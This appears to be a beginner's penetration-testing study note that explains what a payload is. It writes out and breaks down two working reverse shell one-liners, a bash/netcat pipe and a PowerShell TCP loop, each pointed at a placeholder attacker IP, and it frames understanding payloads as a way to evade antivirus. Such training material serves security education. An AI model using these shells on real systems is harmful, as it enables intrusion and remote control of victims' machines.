---
tags: [module/shells-payloads, payloads, one-liners, bash, powershell, level/beginner]
---

# Introduction to Payloads - Beginner's Guide

## What is a Payload?

In computing, a payload is the intended message or data being sent.

In information security, a payload is the command and/or code that exploits a vulnerability and performs a malicious action.

**Think of it like:** The package that delivers the shell.

---

## Real-World Analogy

| Concept | Analogy |
|---------|---------|
| Email | The delivery method |
| The message in the email | The payload |
| Malicious link | The exploit |
| Getting hacked | The result |

---

## Why Payloads Get Blocked

As we saw in the reverse shells section, Windows Defender stopped our PowerShell payload:

This script contains malicious content and has been blocked by your antivirus software.

**Why:** Antivirus recognizes known malicious code patterns.

**The Solution:** Understand what the code does so you can modify it.

---

## Payloads Are Just Instructions

> "Any time we work with payloads, let's challenge ourselves to explore what the code & commands are actually doing."

Payloads aren't magic - they're just instructions telling the computer what to do.

---

## Breaking Down a Linux Payload

### The Netcat/Bash Reverse Shell One-Liner

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER-IP 7777 > /tmp/f

### What Each Part Does

| Part | Purpose |
|------|---------|
| rm -f /tmp/f | Remove any existing pipe file |
| mkfifo /tmp/f | Create a named pipe (FIFO) |
| cat /tmp/f | Read from the pipe |
| /bin/bash -i | Start interactive bash shell |
| 2>&1 | Redirect errors to standard output |
| nc ATTACKER-IP 7777 | Connect to attacker's listener |
| > /tmp/f | Write output back to the pipe |

### How It Flows

1. Create a pipe for two-way communication
2. Bash reads commands from the pipe
3. Netcat sends/receives data through the pipe
4. You get an interactive shell

---

## Breaking Down a Windows Payload

### The PowerShell Reverse Shell One-Liner

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER-IP',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

### Breaking It Down

| Part | Purpose |
|------|---------|
| powershell -nop -c | Start PowerShell with no profile |
| New-Object TCPClient | Create TCP connection to attacker |
| GetStream() | Get the network stream |
| $bytes = 0..65535 | Create empty byte array |
| while loop | Keep reading commands |
| iex $data | Execute the command (Invoke-Expression) |
| Out-String | Convert output to string |
| $stream.Write | Send results back |
| $client.Close() | Close connection when done |

---

## Payloads Come in Many Forms

| Form | Example |
|------|---------|
| One-liner | PowerShell command in cmd |
| Script | .ps1, .sh, .py files |
| Executable | .exe, .elf binaries |
| Macro | Word/Excel documents |
| Web shell | PHP, ASP, JSP files |

---

## The Nishang Project

Nishang is a collection of PowerShell scripts for penetration testing. The `Invoke-PowerShellTcp` function is a more readable version of our one-liner.

Key features:
- Reverse and bind shells
- Well-documented code
- Educational value
- Used in real engagements

---

## Why Understanding Payloads Matters

| Reason | Why |
|--------|-----|
| AV evasion | Modify code to avoid detection |
| Customization | Adapt to target environment |
| Troubleshooting | Fix when payloads fail |
| Education | Learn how shells really work |
| Confidence | You control the code, not vice versa |

---

## Key Takeaways

- Payloads are just instructions for the computer
- AV blocks known malicious patterns
- Break down one-liners to understand them
- Linux payloads use pipes and redirection
- PowerShell payloads use .NET objects
- Payloads can be one-liners, scripts, or binaries
- Nishang provides readable PowerShell examples
- Understanding payloads helps with AV evasion
- Payloads vary by OS and available tools
- The more you understand, the better you'll be
